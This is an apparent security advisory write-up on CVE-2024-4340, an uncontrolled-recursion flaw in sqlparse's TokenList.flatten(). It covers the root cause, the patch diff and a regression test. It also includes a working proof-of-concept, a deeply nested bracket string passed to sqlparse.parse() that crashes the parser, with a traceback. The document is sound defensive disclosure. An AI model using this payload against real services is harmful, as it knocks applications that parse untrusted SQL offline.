1. Detailed Summary  
   • CVE ID: CVE-2024-4340  
   • Package: sqlparse  
   • Affected version: 0.4.4 (all versions < 0.5.0)  
   • Vulnerability type: CWE-674 (Uncontrolled Recursion)  
   • Impact: An attacker can supply a SQL string containing extremely deep nesting of square brackets (or other brackets) to `sqlparse.parse()`.  Internally, sqlparse’s `TokenList.flatten()` calls itself recursively on every subgroup without any depth limit.  With sufficiently deep nesting (e.g. 10 000 open and close brackets), Python’s recursion limit is exceeded, producing a `RecursionError` and crashing the parser.  Because many applications use sqlparse to sanitize, lint, or transform user‐supplied SQL, this leads to a Denial of Service whenever untrusted input is parsed.  

2. Root Cause Analysis  
   • The heart of the issue lies in the implementation of the `TokenList.flatten()` method in `sqlparse/sql.py`.  Its purpose is to walk the tree of grouped tokens and yield every leaf token in sequence.  The code (prior to the patch) looks roughly like this:  
     ```python
     class TokenList(...):
         # ...
         def flatten(self):
             """Generator yielding ungrouped tokens."""
             for token in self.tokens:
                 if token.is_group:
                     # Recurse into every subgroup
                     yield from token.flatten()
                 else:
                     yield token
     ```  
   • Deeply nested bracket constructs (e.g. `[[[[…[[` repeated thousands of times) become nested `TokenList` instances.  Each `flatten()` invocation recurses one level deeper.  Python’s default recursion limit (often 1000) is rapidly exceeded, causing a `RecursionError`.  Because this exception isn’t caught inside sqlparse, it bubbles out, crashing the parser and causing a DoS.  

3. Exploit / Proof of Concept  
   The advisory itself includes a minimal PoC demonstrating the crash.  No special privileges are needed—just call `sqlparse.parse()` with a deeply nested string.  
   
   PoC script (triggering `RecursionError`):  
   ```python
   # trigger_sqlparse_nested_list.py
   import sqlparse

   # Build a very deeply nested list (10 000 opens + closes)
   attack = '[' * 10000 + ']' * 10000

   # This call will exceed Python's recursion limit and crash
   sqlparse.parse(attack)
   ```  
   Sample traceback excerpt:  
   ```
   Traceback (most recent call last):
     File "trigger_sqlparse_nested_list.py", line 3, in <module>
       sqlparse.parse(attack)
     File ".../sqlparse/__init__.py", line 30, in parse
       return tuple(parsestream(sql, encoding))
     File ".../filter_stack.py", line 36, in run
       stmt = grouping.group(stmt)
     File ".../grouping.py", line 428, in group
       func(stmt)
     File ".../grouping.py", line 53, in group_brackets
       _group_matching(tlist, sql.SquareBrackets)
     File ".../grouping.py", line 48, in _group_matching
       tlist.group_tokens(cls, open_idx, close_idx)
     File ".../sql.py", line 328, in group_tokens
       grp = grp_cls(subtokens)
     File ".../sql.py", line 161, in __init__
       super().__init__(None, str(self))
     File ".../sql.py", line 165, in __str__
       return ''.join(token.value for token in self.flatten())
     File ".../sql.py", line 214, in flatten
       yield from token.flatten()
     File ".../sql.py", line 214, in flatten
       yield from token.flatten()
     [... repeated hundreds more times ...]
   RecursionError: maximum recursion depth exceeded
   ```  
   Any service or application that accepts user input and runs `sqlparse.parse()` without prechecking bracket depth can be taken offline by such a payload.  

4. Patch / Mitigation  
   In version 0.5.0, the maintainers added a catch for `RecursionError` inside `TokenList.flatten()` and convert it into a controlled `SQLParseError`.  This prevents a hard crash and allows the calling code to handle the parse failure gracefully.  

   Key changes in `sqlparse/sql.py`:  
   ```diff
    from sqlparse.exceptions import SQLParseError
    ...
    def flatten(self):
        """Generator yielding ungrouped tokens."""
-       for token in self.tokens:
-           if token.is_group:
-               yield from token.flatten()
-           else:
-               yield token
+       try:
+           for token in self.tokens:
+               if token.is_group:
+                   yield from token.flatten()
+               else:
+                   yield token
+       except RecursionError as err:
+           # Convert to a controlled parsing exception
+           raise SQLParseError('Maximum recursion depth exceeded') from err
   ```  
   A corresponding regression test was added in `tests/test_regressions.py` to ensure that excessive nesting raises `SQLParseError` instead of crashing:  
   ```python
   import sys
   import pytest
   import sqlparse
   from sqlparse.exceptions import SQLParseError

   @pytest.fixture
   def limit_recursion():
       curr = sys.getrecursionlimit()
       sys.setrecursionlimit(70)
       yield
       sys.setrecursionlimit(curr)

   def test_max_recursion(limit_recursion):
       with pytest.raises(SQLParseError):
           sqlparse.parse('[' * 100 + ']' * 100)
   ```  
   After upgrading to sqlparse 0.5.0 or later, untrusted input that is too deeply nested will cause a parse‐time `SQLParseError` instead of unbounded recursion, eliminating the Denial of Service vector.